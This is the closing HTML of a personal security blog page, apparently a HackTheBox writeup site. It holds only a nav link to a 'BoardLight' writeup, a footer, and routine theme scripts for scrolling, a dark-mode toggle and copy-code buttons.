    <span>BoardLight Writeup - HackTheBox</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> ¬∑ 

    <span>
        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
